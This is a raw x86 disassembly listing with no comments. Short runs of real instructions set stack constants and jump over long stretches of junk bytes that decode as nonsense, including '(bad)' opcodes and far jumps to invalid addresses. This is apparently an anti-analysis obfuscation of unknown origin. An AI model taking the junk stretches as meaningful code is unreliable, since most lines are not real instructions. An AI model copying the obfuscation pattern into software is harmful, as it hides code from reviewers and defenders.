  421bea:	mov    DWORD PTR [ebp-0x34],edx
  421bed:	mov    DWORD PTR [ebp-0x10],eax
  421bf0:	jmp    0x421cbe
  421bf5:	pop    ds
  421bf6:	or     edx,edi
  421bf8:	mov    eax,0xaf5ffbfe
  421bfd:	nop
  421bfe:	pop    esp
  421bff:	pusha  
  421c00:	or     eax,0x70b979e2
  421c05:	xor    ecx,DWORD PTR [ebx+0xb10001]
  421c0b:	add    BYTE PTR [eax],al
  421c0d:	ficomp WORD PTR [ebx]
  421c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c10:	inc    eax
  421c11:	pop    eax
  421c12:	xchg   esp,eax
  421c13:	inc    esp
  421c14:	mov    eax,0x82f32e1c
  421c19:	sbb    eax,edx
  421c1b:	cmp    ecx,DWORD PTR [esp+ecx*2]
  421c1e:	mov    al,ds:0x733cb3cf
  421c23:	and    edx,DWORD PTR [ebp-0x20a43ef3]
  421c29:	xor    ecx,DWORD PTR [esi]
  421c2b:	xchg   dh,bh
  421c2d:	loop   0x421c8b
  421c2f:	call   0x7191ed67
  421c34:	and    BYTE PTR [eax],ah
  421c36:	imul   edi,DWORD PTR [eax-0x42],0x3a954cdc
  421c3d:	aaa    
  421c3e:	inc    ebp
  421c3f:	or     DWORD PTR [eax],esp
  421c41:	mov    gs,WORD PTR [ecx-0x68441c04]
  421c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c48:	es cmp edi,0x6940aa1d
  421c4f:	push   eax
  421c50:	add    al,0x65
  421c52:	fcmovu st,st(3)
  421c54:	push   ecx
  421c55:	dec    esi
  421c56:	mov    ebp,0xa09627ec
  421c5b:	inc    edi
  421c5c:	cmp    ah,bl
  421c5e:	int3   
  421c5f:	inc    ebp
  421c60:	mov    dl,0x17
  421c62:	cmp    BYTE PTR [esi-0x61],ah
  421c65:	inc    eax
  421c66:	cmp    DWORD PTR [edx+0x1a],ecx
  421c69:	int    0xee
  421c6b:	sub    DWORD PTR [edi],ebx
  421c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c6e:	xor    eax,DWORD PTR [esi]
  421c70:	cdq    
  421c71:	sub    dl,BYTE PTR [ecx-0x40]
  421c74:	push   0x6c
  421c76:	mov    ds:0xe6ab75f,al
  421c7b:	push   esp
  421c7c:	mov    ch,0x90
  421c7e:	xchg   edi,eax
  421c7f:	(bad)
  421c83:	neg    BYTE PTR [ebp-0x4491ae16]
  421c89:	cmp    al,0x55
  421c8b:	push   es
  421c8c:	mov    esp,0x776943d8
  421c91:	inc    edi
  421c92:	mov    al,0x70
  421c94:	jl     0x421c16
  421c96:	jmp    0xefb62c13
  421c9b:	mov    eax,esp
  421c9d:	out    dx,al
  421c9e:	mov    ch,0xd4
  421ca0:	or     BYTE PTR [ebx+0x7f],cl
  421ca3:	dec    esi
  421ca4:	push   cs
  421ca5:	adc    ebx,DWORD PTR [esi]
  421ca7:	jmp    0x1ff116da
  421cac:	cmp    esi,DWORD PTR [edx-0x1a]
  421caf:	mov    esi,fs
  421cb1:	xor    eax,0x9c6cf014
  421cb6:	(bad)
  421cba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cbb:	jle    0x421d27
  421cbd:	cdq    
  421cbe:	cmp    DWORD PTR [ebp-0x30],eax
  421cc1:	jbe    0x4239ff
  421cc7:	add    eax,DWORD PTR [ebp-0x1c]
  421cca:	mov    DWORD PTR [ebp-0x34],eax
  421ccd:	mov    al,BYTE PTR [eax]
  421ccf:	mov    DWORD PTR [ebp-0xc],0x3b78
  421cd6:	jmp    0x421da4
  421cdb:	shl    DWORD PTR [esi-0x3e],cl
  421cde:	(bad)  
  421cdf:	out    0xfe,eax
  421ce1:	(bad)  
  421ce2:	jg     0x421d31
  421ce4:	cmp    DWORD PTR [esi-0x22],eax
  421ce7:	sbb    edi,DWORD PTR [esi-0x3c]
  421cea:	je     0x421cd0
  421cec:	mov    eax,DWORD PTR [ecx]
  421cee:	add    BYTE PTR [ecx-0x52000000],dh
  421cf4:	fs jecxz 0x421ce3
  421cf7:	loope  0x421c82
  421cf9:	jle    0x421d2b
  421cfb:	out    0xfb,al
  421cfd:	nop
  421cfe:	ins    DWORD PTR es:[edi],dx
  421cff:	lock test eax,0x63036f69
  421d05:	cli    
  421d06:	les    ebx,FWORD PTR [ecx]
  421d08:	cmc    
  421d09:	sbb    eax,0x296b2a56
  421d0e:	shl    BYTE PTR [edi+0x55],cl
  421d11:	shl    BYTE PTR [edx],0x82
  421d14:	out    0xec,eax
  421d16:	jmp    0x7c661011
  421d1b:	cmp    al,0x56
  421d1d:	push   edx
  421d1e:	sub    eax,eax
  421d20:	mov    ebp,0x7cb625e8
  421d25:	mov    ch,0x58
  421d27:	mov    eax,0x5daf3238
  421d2c:	adc    BYTE PTR [edx-0x54144ad0],dh
  421d32:	sub    esp,ebp
  421d34:	pop    esi
  421d36:	aas    
  421d37:	jo     0x421d55
  421d39:	and    DWORD PTR [esi],esp
  421d3b:	int    0x3a
  421d3d:	add    eax,0xf00da0ba
  421d42:	outs   dx,BYTE PTR ds:[esi]
  421d43:	scas   al,BYTE PTR es:[edi]
  421d44:	stos   BYTE PTR es:[edi],al
  421d45:	dec    esp
  421d46:	push   esi
  421d47:	mov    eax,edi
  421d49:	test   eax,0xaa808e
  421d4e:	sub    al,0x97
  421d50:	jne    0x421d61
  421d52:	cmp    DWORD PTR [edi],eax
  421d54:	imul   esp,DWORD PTR [edi+0xd0373d4],0xe236038b
  421d5e:	cli    
  421d5f:	rcr    DWORD PTR [ebp-0x7877d750],1
  421d65:	loopne 0x421dd7
  421d67:	in     al,dx
  421d68:	push   ss
  421d69:	imul   esi,DWORD PTR [edi-0x2c],0x74
  421d6d:	pushf  
  421d6e:	nop
  421d6f:	pop    ss
  421d70:	fmul   st(4),st
  421d72:	shr    DWORD PTR [ebp-0x64],cl
  421d75:	daa    
  421d76:	jmp    0x6ab758a
  421d7b:	sahf   
  421d7c:	add    DWORD PTR [bp+di+0x27],edx
  421d80:	aas    
  421d81:	pop    esi
  421d82:	cmp    ah,bl
  421d84:	or     ecx,0x5a
  421d87:	imul   edx,DWORD PTR [ebx-0x67],0xffffffe9
  421d8b:	sbb    al,BYTE PTR [esi+0x13]
  421d8e:	and    DWORD PTR [esi-0x848cc70],esp
  421d94:	jmp    0x3570d3c3
  421d99:	(bad)
  421d9d:	mov    ebx,0x14952fcf
  421da2:	dec    ebx
  421da3:	xchg   esi,eax
  421da4:	mov    BYTE PTR [ebp-0x1],al
  421da7:	mov    DWORD PTR [ebp-0x8],0xa4b
  421dae:	jmp    0x421e7c
  421db3:	clc    
  421db4:	fs mov bl,0xa8
  421db7:	mov    edi,0x374fbff
  421dbc:	fldenv [ebp-0x71045799]
  421dc2:	mov    edi,0x18c95
  421dc7:	mov    cl,0x0
  421dc9:	add    BYTE PTR [eax],al
  421dcb:	out    0x35,eax
  421dcd:	ds int3 
  421dcf:	mov    bh,0x95
  421dd1:	out    0xce,al
  421dd3:	dec    ecx
  421dd4:	in     eax,dx
  421dd5:	mov    ecx,0xd013732d
  421dda:	daa    
  421ddb:	mov    dh,0x2a
  421ddd:	and    bh,dl
  421ddf:	out    0x3c,al
  421de1:	imul   ecx,DWORD PTR [edi-0x1817e06d],0xa078076d
  421deb:	adc    ch,cl
  421ded:	aaa    
  421dee:	and    BYTE PTR [edi],bh
  421df0:	fist   DWORD PTR [esi-0x4]
  421df3:	pusha  
  421df4:	xor    ecx,DWORD PTR [edi-0x28bde973]
  421dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dfb:	ja     0x421e34
  421dfd:	in     al,dx
  421dfe:	int    0x66
  421e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e01:	jne    0x421e6e
  421e03:	add    DWORD PTR [eax+edx*4-0x41],ebx
  421e07:	add    al,0x89
  421e09:	adc    al,0x9d
  421e0b:	gs push ss
  421e0d:	add    al,0x4f
  421e0f:	adc    BYTE PTR [ebx-0x7dda3492],bl
  421e15:	add    esp,eax
  421e17:	mov    al,0x46
  421e19:	jae    0x421e0b
  421e1b:	popa   
  421e1c:	sar    al,0xed
  421e1f:	xor    BYTE PTR [esi-0x6],ah
  421e22:	(bad)  
  421e23:	mov    cl,al
  421e25:	xchg   esp,eax
  421e26:	ret    
  421e27:	push   ss
  421e28:	test   DWORD PTR [edi+0xc814df6],0x3527ebb1
  421e32:	test   al,0x76
  421e34:	mov    eax,0x2e8bb863
  421e39:	enter  0x7845,0x15
  421e3d:	dec    ebp
  421e3e:	lea    ecx,[ecx-0x6be3f3b0]
  421e44:	fisubr WORD PTR [esp+ebp*4]
  421e47:	(bad)  
  421e48:	push   DWORD PTR [edx+0x6362502a]
  421e4e:	repnz test al,0x69
  421e51:	gs loopne 0x421e82
  421e54:	adc    eax,0xddd87eb0
  421e59:	aaa    
  421e5a:	out    0x2f,al
  421e5c:	cli    
  421e5d:	sbb    BYTE PTR [ecx*1+0x35463a9b],dh
  421e64:	fisubr DWORD PTR [esi-0x26]
  421e67:	aaa    
  421e68:	ret    
  421e69:	push   eax
  421e6a:	out    0x39,al
  421e6c:	and    ah,dl
  421e6e:	dec    edx
  421e6f:	sbb    ebx,DWORD PTR [ecx+ebx*1+0x6aec0396]
  421e76:	adc    eax,edx
  421e78:	clc    
  421e79:	loopne 0x421ebd
  421e7b:	push   edi
  421e7c:	mov    eax,DWORD PTR [ebp-0x8]
  421e7f:	mov    edx,DWORD PTR [ebp-0xc]
  421e82:	jmp    0x421f50
  421e87:	inc    eax
  421e88:	push   ebp
  421e89:	or     al,0x13
  421e8b:	sbb    eax,0x8a575f5b
  421e90:	std    
  421e91:	adc    eax,0xd1732a9f
  421e96:	dec    esi
  421e97:	inc    esi
  421e98:	lea    eax,[ecx]
  421e9a:	add    BYTE PTR [ecx-0x74000000],dh
  421ea0:	sub    al,0x99
  421ea2:	repnz sub al,BYTE PTR fs:[edi]
  421ea6:	jmp    0x421eed
  421ea8:	das    
  421ea9:	push   ds
  421eaa:	into   
  421eab:	or     al,0x22
  421ead:	pushf  
  421eae:	xor    esp,DWORD PTR [edi+ecx*8-0x69]
  421eb2:	mov    eax,0x212a534a
  421eb7:	xchg   esi,eax
  421eb8:	scas   eax,DWORD PTR es:[edi]
  421eb9:	xor    al,0x44
  421ebb:	jns    0x421eb8
  421ebd:	popf   
  421ebe:	jae    0x421f1d
  421ec0:	xchg   ebp,eax
  421ec1:	stos   BYTE PTR es:[edi],al
  421ec2:	test   al,0x5c
  421ec4:	mov    eax,ds:0xc3ab7f5d
  421ec9:	out    dx,al
  421eca:	cmp    BYTE PTR [ecx+ecx*1-0x5d],al
  421ece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ecf:	push   edx
  421ed0:	jp     0x421ec3
  421ed2:	inc    edi
  421ed3:	push   cs
  421ed4:	scas   eax,DWORD PTR es:[edi]
  421ed5:	mov    ebp,0xd073121b
  421eda:	xchg   eax,edi
  421edc:	popa   
  421edd:	cwde   
  421ede:	mov    dh,0x43
  421ee0:	aad    0xe0
  421ee2:	pop    edx
  421ee3:	in     eax,dx
  421ee4:	neg    BYTE PTR [edx+0x3]
  421ee7:	outs   dx,DWORD PTR ds:[esi]
  421ee8:	(bad)  
  421ee9:	scas   al,BYTE PTR es:[edi]
  421eea:	pop    esi
  421eeb:	neg    BYTE PTR [ecx+0x15ff235e]
  421ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ef2:	adc    BYTE PTR gs:[ecx-0x61],ch
  421ef6:	and    DWORD PTR [edx+edx*1-0x59],ecx
  421efa:	aam    0xb1
  421efc:	cmc    
  421efd:	push   esi
  421efe:	cmp    eax,0xcf49b5be
  421f03:	mov    DWORD PTR [edx-0x74],ecx
  421f06:	sbb    ecx,esp
  421f08:	and    ecx,DWORD PTR [edi+0x73c8a0c9]
  421f0e:	inc    esp
  421f0f:	int3   
  421f10:	out    dx,al
  421f11:	cmp    BYTE PTR ss:[ebx+0xf],ch
  421f15:	gs dec ebx
  421f17:	mov    bl,0xa9
  421f19:	sub    dh,BYTE PTR ss:[eax+0x29d422fd]
  421f20:	inc    eax
  421f21:	rol    DWORD PTR [ebx+eax*1-0x15],1
  421f25:	sbb    ebx,DWORD PTR [esp+eax*4+0x301d2cc6]
  421f2c:	hlt    
  421f2d:	pop    ss
  421f2e:	and    bh,al
  421f30:	pop    eax
  421f31:	shl    DWORD PTR [ebx],1
  421f33:	(bad)  
  421f35:	and    DWORD PTR ds:[esi+0x23f974a2],ecx
  421f3c:	mov    ebp,0xb2c1c0a1
  421f41:	mov    ecx,cs
  421f43:	mov    ch,0xa0
  421f45:	leave  
  421f46:	or     BYTE PTR [ebp-0x3e],ah
  421f49:	push   eax
  421f4a:	or     DWORD PTR [ebx],ecx
  421f4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f4d:	and    DWORD PTR [ebp-0x56],edx
  421f50:	or     eax,0x601
  421f55:	xor    eax,0xffffe0ef
  421f5a:	and    eax,edx
  421f5c:	jmp    0x42202a
  421f61:	add    DWORD PTR [esi-0x39],ecx
  421f64:	xchg   esi,eax
  421f65:	iret   
  421f66:	lahf   
  421f67:	push   ecx
  421f68:	fbstp  TBYTE PTR [ebx+eax*2-0x56]
  421f6c:	or     eax,0xbf8eec8b
  421f71:	test   DWORD PTR [ebp+0xb10001],0x15d40000
  421f7b:	inc    eax
  421f7c:	cli    
  421f7d:	jge    0x421f33
  421f7f:	sbb    BYTE PTR [edi],ch
  421f81:	pop    es
  421f82:	bound  ecx,QWORD PTR [ebx-0x5932a4bb]
  421f88:	mov    cs,WORD PTR [ebx-0x201629d3]
  421f8e:	popf   
  421f8f:	test   BYTE PTR [edi-0x5a],ah
  421f92:	jmp    0xe8bd0996
  421f97:	pop    ss
  421f98:	mov    al,ds:0x924868c4
  421f9d:	sbb    al,BYTE PTR [ebp+0x38]
  421fa0:	cld    
  421fa1:	shl    BYTE PTR [edi+esi*4+0x570b4440],1
  421fa8:	rol    DWORD PTR [edx+0x24],cl
  421fab:	lods   eax,DWORD PTR ds:[esi]
  421fac:	sub    DWORD PTR [ebx-0xc3ff3d5],edx
  421fb2:	mov    ecx,edx
  421fb4:	loopne 0x421f66
  421fb6:	mov    dh,0x14
  421fb8:	imul   ecx,DWORD PTR [ebp+0x7d],0x28
  421fbc:	hlt    
  421fbd:	aas    
  421fbe:	loope  0x421f85
  421fc0:	jp     0x421fc7
  421fc2:	and    eax,0x6052f672
  421fc7:	dec    ebx
  421fc8:	push   es
  421fc9:	mov    DWORD PTR [edi],esi
  421fcb:	xor    ah,bl
  421fcd:	cmp    al,BYTE PTR [edx-0x37]
  421fd0:	cs cmc 
  421fd2:	jle    0x422006
  421fd4:	mov    al,0xd8
  421fd6:	out    0x28,al
  421fd8:	fcomip st,st(7)
  421fda:	mov    edi,0x1ac2f5fc
  421fdf:	xchg   edi,eax
  421fe0:	rcr    BYTE PTR es:[edi+0x1f496837],1
  421fe7:	(bad)  
  421fe8:	pop    esi
  421fe9:	or     ebp,esi
  421feb:	mov    ch,0x61
  421fed:	dec    ebx
  421fee:	popf   
  421fef:	push   cs
  421ff0:	xchg   esi,eax
  421ff1:	pop    ss
  421ff2:	es inc edi
  421ff4:	jo     0x42203e
  421ff6:	out    0xb,eax
  421ff8:	cmc    
  421ff9:	retf   0x9cf0
  421ffc:	jb     0x421fdc
  421ffe:	adc    BYTE PTR ds:0xf78298c3,bl
  422004:	jl     0x42201b
  422006:	jne    0x42201d
  422008:	(bad)  
  422009:	mov    ds:0x982f36c9,eax
  42200e:	mov    ebp,0x57262dce
  422013:	xor    DWORD PTR ds:0xe9406e5c,esp
  422019:	neg    BYTE PTR [edx-0x7e5b262d]
  42201f:	std    
  422020:	mov    esp,0x58529022
  422025:	dec    esi
  422026:	sti    
  422027:	dec    esi
  422028:	cmp    eax,0x5f1925cf
  42202d:	add    BYTE PTR [eax],al
  42202f:	mov    DWORD PTR [ebp-0x18],eax
  422032:	mov    DWORD PTR [ebp-0xc],0x1
  422039:	mov    DWORD PTR [ebp-0x8],0x47ff
  422040:	jmp    0x42210e
  422045:	sbb    BYTE PTR [ebp+ebx*4-0x1c],0xdf
  42204a:	in     eax,0xfb
  42204c:	jle    0x4220ae
  42204e:	jmp    0x33ea:0x67799f47
  422055:	test   al,0x8e
  422057:	add    DWORD PTR [eax],eax
  422059:	mov    cl,0x0
  42205b:	add    BYTE PTR [eax],al
  42205d:	mov    bl,0x21
  42205f:	fbstp  TBYTE PTR [ecx]
  422061:	stos   DWORD PTR es:[edi],eax
  422062:	or     al,0x65
  422064:	in     al,dx
  422065:	aas    
  422066:	(bad)  
  422067:	lods   eax,DWORD PTR ds:[esi]
  422068:	or     BYTE PTR [edi+ebx*2+0x36],bl
  42206c:	sbb    BYTE PTR [edx+0x75d663b6],0xd6
  422073:	outs   dx,DWORD PTR ds:[esi]
  422074:	pop    ebx
  422075:	mov    WORD PTR [ecx+0x44378293],cs
  42207b:	fs pusha 
  42207d:	pop    eax
  42207e:	jmp    0xd5d2e8a6
  422083:	adc    DWORD PTR [ebp-0x1c210632],ebp
  422089:	mov    edx,0x83237a12
  42208e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42208f:	ret    0x1067
  422092:	pop    ebx
  422093:	jmp    0x7a63:0x95ecce1f
  42209a:	jae    0x4220e1
  42209c:	test   DWORD PTR [eax-0x1a38d558],ecx
  4220a2:	sbb    esi,edi
  4220a4:	(bad)  
  4220a5:	cs add eax,0xff28c4e2
  4220ab:	push   ds
  4220ac:	scas   al,BYTE PTR es:[edi]
  4220ad:	jle    0x4220b7
  4220af:	ror    DWORD PTR [ebx],0xdc
  4220b2:	arpl   WORD PTR [edi+0x69],cx
  4220b5:	xor    BYTE PTR [esi+ebx*2+0x7e],0xdf
  4220ba:	add    esi,ebp
  4220bc:	je     0x422068
  4220be:	repnz lds edx,FWORD PTR [edx+0x6f61666b]
  4220c5:	daa    
  4220c6:	arpl   ax,ax
  4220c8:	adc    BYTE PTR [edx+esi*4],al
  4220cb:	jg     0x4220fd
  4220cd:	mov    ebp,0x82e86d6d
  4220d2:	xor    DWORD PTR ds:0xdd495438,esi
  4220d8:	std    
  4220d9:	popf   
  4220da:	jmp    0x4307:0x7334a6de
  4220e1:	ret    
  4220e2:	mov    BYTE PTR [eax-0x64fbbb69],ah
  4220e8:	dec    esp
  4220e9:	je     0x4220f6
  4220eb:	mov    dh,0x5e
  4220ed:	mov    ds,WORD PTR [ebx+0x70c1997a]
  4220f3:	pop    edx
  4220f4:	aad    0x27
  4220f6:	xlat   BYTE PTR ds:[ebx]
  4220f7:	sub    eax,0x92e4c5d7
  4220fc:	mov    eax,0xab411e1b
  422101:	(bad)  
  422103:	adc    dh,BYTE PTR [esi-0x1d68b66b]
  422109:	or     DWORD PTR [ebx+0x35],edx
  42210c:	loop   0x422112
  42210e:	mov    eax,DWORD PTR [ebp-0x8]
  422111:	mov    ebx,DWORD PTR [ebp-0xc]
  422114:	and    eax,edi
  422116:	jmp    0x4221e4
  42211b:	lds    ebx,FWORD PTR ds:[esi]
  42211e:	inc    edx
  42211f:	(bad)  
  422120:	fstp   TBYTE PTR [esi-0x3]
  422123:	aas    
  422124:	sbb    DWORD PTR [edi-0x61],edi
  422127:	fdivr  st,st(0)
  422129:	retw   
  42212b:	pop    ecx
  42212c:	pop    DWORD PTR [ecx]
  42212e:	add    BYTE PTR [ecx+0x4e000000],dh
  422134:	test   eax,0xd519cba0
  422139:	sar    DWORD PTR [esi+0x1708f44a],cl
  42213f:	shl    DWORD PTR [ebx+ebx*8],1
  422142:	push   0x4f910219
  422147:	(bad)  
  422148:	imul   edx,DWORD PTR [edi-0x4c],0x39
  42214c:	fdiv   DWORD PTR [edi+0x75]
  42214f:	jnp    0x422132
  422151:	xchg   esi,eax
  422152:	adc    al,0x8f
  422154:	es das 
  422156:	cmp    eax,0xf184fd18
  42215b:	rol    BYTE PTR [ecx],1
  42215d:	jmp    0x68ef:0x2d8e925f
  422164:	retf   0xcb4b
  422167:	xchg   edi,eax
  422168:	shl    esp,0x75
  42216b:	call   0x4f69:0x3d26ae52
  422172:	fwait
  422173:	icebp  
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	rcl    BYTE PTR ds:0xb93fef5b,cl
  42217b:	repnz sbb DWORD PTR [ebx],esi
  42217e:	retf   
  42217f:	inc    edi
  422180:	and    BYTE PTR [eax],dh
  422182:	call   0xce1e:0x14a0589d
  422189:	outs   dx,DWORD PTR ds:[esi]
  42218a:	fisub  WORD PTR [ebx+ecx*2]
  42218d:	call   DWORD PTR [eax]
  42218f:	loop   0x422127
  422191:	push   ds
  422192:	retf   
  422193:	pop    es
  422194:	add    dl,bl
  422196:	inc    ebx
  422197:	leave  
  422198:	(bad)
  42219c:	int    0xf6
  42219e:	jge    0x42220c
  4221a0:	mov    eax,0x566b6ac4
  4221a6:	add    DWORD PTR [ecx+0xd],esp
  4221a9:	cs pop ds
  4221ab:	cmp    BYTE PTR [ecx],ah
  4221ad:	je     0x422175
  4221af:	pop    edi
  4221b0:	fstp   TBYTE PTR [ecx+0xf]
  4221b3:	inc    ebp
  4221b4:	rol    DWORD PTR [ebx+0x28],0x46
  4221b8:	jb     0x4221b0
  4221ba:	ja     0x4221f6
  4221bc:	xchg   edi,eax
  4221bd:	sub    al,0xfa
  4221bf:	aam    0x31
  4221c1:	(bad)  
  4221c3:	loopne 0x4221b6
  4221c5:	lods   eax,DWORD PTR ds:[esi]
  4221c6:	mov    ebx,0x7feb642e
  4221cb:	jmp    0xe30a:0x5684a299
  4221d2:	sub    bh,BYTE PTR [ecx-0x10207339]
  4221d8:	imul   esp,DWORD PTR ds:0xed70c182,0x73657649
  4221e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221e3:	sub    dh,BYTE PTR [ebx]
  4221e5:	shl    BYTE PTR [ebx],cl
  4221e7:	shl    edi,0xf3
  4221ea:	mov    edx,DWORD PTR [ebp-0x18]
  4221ed:	cmp    eax,edx
  4221ef:	jae    0x423513
  4221f5:	mov    DWORD PTR [ebp-0x24],0x4de2
  4221fc:	jmp    0x4222ca
  422201:	pop    edx
  422202:	js     0x42225a
  422204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422205:	jbe    0x4221b6
  422207:	sti    
  422208:	(bad)  
  422209:	mov    eax,0x560d02ed
  42220e:	outs   dx,DWORD PTR ds:[esi]
  42220f:	loope  0x4221d0
  422211:	or     dl,BYTE PTR [eax+0xb10001]
  422217:	add    BYTE PTR [eax],al
  422219:	jmp    0x3ade8423
  42221e:	or     BYTE PTR [edx+0x26],bh
  422221:	sbb    edx,0x63
  422224:	or     bh,BYTE PTR [ecx+0x52f2cd5e]
  42222a:	data16 fidiv WORD PTR [edi]
  42222d:	sub    ecx,ebp
  42222f:	mov    fs,WORD PTR [ecx+eiz*2]
  422232:	add    ecx,DWORD PTR [eax]
  422234:	(bad)  
  422235:	iret   
  422236:	jo     0x42229a
  422238:	xchg   esp,eax
  422239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42223a:	push   ss
  42223b:	dec    edi
  42223c:	sub    DWORD PTR [eax],esp
  42223e:	pop    esi
  42223f:	mov    cs,esp
  422241:	sub    ebx,DWORD PTR [edx]
  422243:	ret    
  422244:	shr    ecx,cl
  422246:	popa   
  422247:	jne    0x42221b
  422249:	(bad)  [ecx-0xa37a17e]
  42224f:	jmp    0x36ad:0xb7f9b7a5
  422256:	add    eax,0x8c670cc8
  42225b:	in     eax,0x13
  42225d:	fisub  DWORD PTR [esi+0x27]
  422260:	inc    edi
  422261:	mov    cl,0xd2
  422263:	mov    dh,0xc0
  422265:	cld    
  422266:	jmp    0x703e:0xbb753c09
  42226d:	retf   
  42226e:	mov    bh,0xd5
  422270:	ds sub eax,0x781c3036
  422276:	ret    
  422277:	clc    
  422278:	fisubr DWORD PTR [esp+edi*2]
  42227b:	(bad)  
  42227c:	jmp    0xc09d88eb
  422281:	push   ss
  422282:	popa   
  422283:	icebp  
  422284:	cmp    DWORD PTR [ebx-0x4d],edx
  422287:	fimul  WORD PTR [ebx+0x5d]
  42228a:	or     dl,dh
  42228c:	cmp    BYTE PTR [ecx+0x8456aee],0x12
  422293:	out    dx,al
  422294:	mov    ds:0x23275753,eax
  422299:	jp     0x42231a
  42229b:	push   ebx
  42229c:	es mov esp,0x1e43c021
  4222a2:	inc    ebx
  4222a3:	sub    edi,ecx
  4222a5:	fwait
  4222a6:	xor    ebp,ebp
  4222a8:	xchg   DWORD PTR [esi-0x59],eax
  4222ab:	dec    eax
  4222ac:	ret    
  4222ad:	jl     0x422269
  4222af:	add    al,0xa4
  4222b1:	xchg   BYTE PTR [esi+0x5291bb12],ah
  4222b7:	shl    DWORD PTR [ebx-0xf236c73],1
  4222bd:	xor    DWORD PTR [edi+0x13],ebp
  4222c0:	in     al,dx
  4222c1:	jg     0x422312
  4222c3:	jl     0x4222bd
  4222c5:	inc    ebp
  4222c6:	jmp    0xec45:0xc74977c5
  4222cd:	es aaa 
  4222cf:	add    BYTE PTR [eax],al
  4222d1:	mov    DWORD PTR [ebp-0x18],0x2e39
  4222d8:	mov    DWORD PTR [ebp-0xc],0x7c06
  4222df:	mov    DWORD PTR [ebp-0x8],0x6909
  4222e6:	mov    eax,DWORD PTR [ebp-0x8]
  4222e9:	mov    edx,DWORD PTR [ebp-0xc]
  4222ec:	sub    edx,eax
  4222ee:	mov    eax,DWORD PTR [ebp-0x18]
  4222f1:	xor    edx,eax
  4222f3:	mov    eax,DWORD PTR [ebp-0x14]
  4222f6:	sub    edx,0x2897
  4222fc:	imul   edx,eax
  4222ff:	mov    eax,DWORD PTR [ebp-0x24]
  422302:	and    edx,eax
  422304:	mov    DWORD PTR [ebp-0x24],edx
  422307:	jmp    0x4223d5
  42230c:	mov    gs,WORD PTR [ebx]
  42230e:	mov    ds:0xdffea776,eax
  422313:	sti    
  422314:	test   al,0xc9
  422316:	out    dx,al
  422317:	int    0x87
  422319:	dec    eax
  42231a:	scas   eax,DWORD PTR es:[edi]
  42231b:	int    0xbb
  42231d:	nop
  42231e:	add    DWORD PTR [eax],eax
  422320:	mov    cl,0x0
  422322:	add    BYTE PTR [eax],al
  422324:	fstp   QWORD PTR gs:[ecx+0x1b]
  422328:	nop
  422329:	fdecstp 
  42232b:	xchg   esi,eax
  42232c:	pop    eax
  42232d:	mov    al,ds:0xc3da31c6
  422332:	and    dh,BYTE PTR [edx]
  422334:	push   esi
  422335:	arpl   cx,sp
  422337:	in     eax,0x6d
  422339:	dec    ebp
  42233a:	(bad)  
  42233c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42233d:	sub    eax,eax
  42233f:	rcr    BYTE PTR [ebp-0x6f9c6727],0x51
  422346:	aam    0xf1
  422348:	jge    0x422350
  42234a:	push   es
  42234b:	jo     0x422372
  42234d:	sbb    BYTE PTR [ebx],0xaa
  422350:	or     DWORD PTR [eax-0x4c],esi
  422353:	xchg   ecx,eax
  422354:	pop    esi
  422355:	xchg   esp,eax
  422356:	jmp    0x33e72675
  42235b:	jno    0x422392
  42235d:	or     eax,0xbab6c00e
  422362:	fimul  WORD PTR ds:0x29a80779
  422368:	xchg   esi,eax
  422369:	aad    0x8a
  42236b:	test   DWORD PTR [eax+0x2c691284],edx
  422371:	xchg   ebx,eax
  422372:	sub    al,0xeb
  422374:	adc    eax,0xf145673b
  422379:	sbb    bh,al
  42237b:	nop
  42237c:	js     0x42236a
  42237e:	fsub   st(5),st
  422380:	stc    
  422381:	pop    ebx
  422382:	dec    ebp
  422383:	in     al,0xb2
  422385:	cmp    cl,ah
  422387:	adc    BYTE PTR [edx+edx*4+0x45],bl
  42238b:	(bad)  [ebp-0x31]
  42238e:	xlat   BYTE PTR ds:[ebx]
  42238f:	mov    ah,BYTE PTR [edi]
  422391:	mov    ecx,0x9e8e809
  422396:	jne    0x422382
  422398:	cwde   
  422399:	inc    esi
  42239a:	xchg   edi,eax
  42239b:	push   0x2a
  42239d:	aad    0x6b
  42239f:	rol    ebp,1
  4223a1:	mov    ebp,0xd069b60e
  4223a6:	push   ecx
  4223a7:	test   DWORD PTR [ebp-0x72],ebx
  4223aa:	rcr    BYTE PTR [edx-0x38],cl
  4223ad:	sub    ebx,esp
  4223af:	xchg   DWORD PTR [ecx-0x50],esp
  4223b2:	jg     0x4223a9
  4223b4:	imul   ecx,DWORD PTR [ebx-0x5f6617ac],0xffffff82
  4223bb:	(bad)  
  4223bc:	adc    al,0xa1
  4223be:	ss cmc 
  4223c0:	cmp    ecx,DWORD PTR [esi+0x30eae0d6]
  4223c6:	popf   
  4223c7:	daa    
  4223c8:	test   al,0xec
  4223ca:	sahf   
  4223cb:	mov    bl,bh
  4223cd:	jle    0x42241e
  4223cf:	jno    0x42241a
  4223d1:	sbb    BYTE PTR [esi],cl
  4223d3:	sub    dh,ch
  4223d5:	mov    DWORD PTR [ebp-0x8],0x3b78
  4223dc:	mov    DWORD PTR [ebp-0x24],0xa4b
  4223e3:	mov    eax,DWORD PTR [ebp-0x24]
  4223e6:	jmp    0x4224b4
  4223eb:	mov    dh,0xfb
  4223ed:	ss mov edi,0xfbbfff7f
  4223f3:	mov    ds:0xd1a1599b,al
  4223f8:	cmc    
  4223f9:	jg     0x42245a
  4223fb:	ins    BYTE PTR es:[edi],dx
  4223fc:	xchg   ecx,eax
  4223fd:	add    DWORD PTR [eax],eax
  4223ff:	mov    cl,0x0
  422401:	add    BYTE PTR [eax],al
  422403:	bnd call 0x5104307d
  422409:	xchg   ebx,eax
